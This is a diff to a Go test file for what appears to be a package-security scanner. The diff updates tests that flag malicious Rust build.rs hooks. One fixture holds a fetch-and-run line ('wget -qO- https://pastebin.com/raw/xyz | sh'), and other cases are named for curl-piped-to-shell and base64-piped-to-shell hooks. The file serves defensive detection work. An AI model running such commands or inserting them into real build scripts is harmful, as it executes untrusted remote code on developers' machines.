@@ -1,6 +1,7 @@
 package heuristics
 
 import (
+	"slices"
 	"testing"
 
 	"github.com/qwexvf/aegis-cli/internal/domain"
@@ -8,9 +9,10 @@ import (
 
 func TestDetectCargoBuildHook(t *testing.T) {
 	tests := []struct {
-		name string
-		body string
-		want domain.Capability
+		name    string
+		body    string
+		wantCap domain.Capability
+		wantLen int
 	}{
 		{
 			name: "curl|sh via Command::new",
@@ -21,7 +23,7 @@ func TestDetectCargoBuildHook(t *testing.T) {
 					.status()
 					.ok();
 			}`,
-			want: domain.CapInstallHookSuspicious,
+			wantCap: domain.CapInstallHookSuspicious,
 		},
 		{
 			name: "base64 piped to shell",
@@ -32,7 +34,7 @@ func TestDetectCargoBuildHook(t *testing.T) {
 					.status()
 					.ok();
 			}`,
-			want: domain.CapInstallHookSuspicious,
+			wantCap: domain.CapInstallHookSuspicious,
 		},
 		{
 			name: "wget pastebin then sh",
@@ -42,7 +44,7 @@ func TestDetectCargoBuildHook(t *testing.T) {
 					.arg("wget -qO- https://pastebin.com/raw/xyz | sh")
 					.status();
 			}`,
-			want: domain.CapInstallHookSuspicious,
+			wantCap: domain.CapInstallHookSuspicious,
 		},
 		{
 			name: "vanilla build.rs — sets cargo env vars only",
@@ -50,20 +52,27 @@ func TestDetectCargoBuildHook(t *testing.T) {
 				println!("cargo:rerun-if-changed=build.rs");
 				println!("cargo:rustc-link-lib=foo");
 			}`,
-			want: 0,
+			wantLen: 0,
 		},
 		{
-			name: "empty build.rs",
-			body: ``,
-			want: 0,
+			name:    "empty build.rs",
+			body:    ``,
+			wantLen: 0,
 		},
 	}
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			got := DetectCargoBuildHook([]byte(tt.body))
-			if got != tt.want {
-				t.Errorf("DetectCargoBuildHook = %v, want %v", got, tt.want)
+			body := []byte(tt.body)
+			got := checkInstallHooks(NormalizedPackage{Hooks: []Hook{{Phase: "build", Body: string(body)}}})
+			if tt.wantCap != 0 {
+				if !slices.Contains(got, tt.wantCap) {
+					t.Errorf("checkInstallHooks = %v, want %v", got, tt.wantCap)
+				}
+			} else {
+				if len(got) != 0 {
+					t.Errorf("checkInstallHooks = %v, want empty", got)
+				}
 			}
 		})
 	}
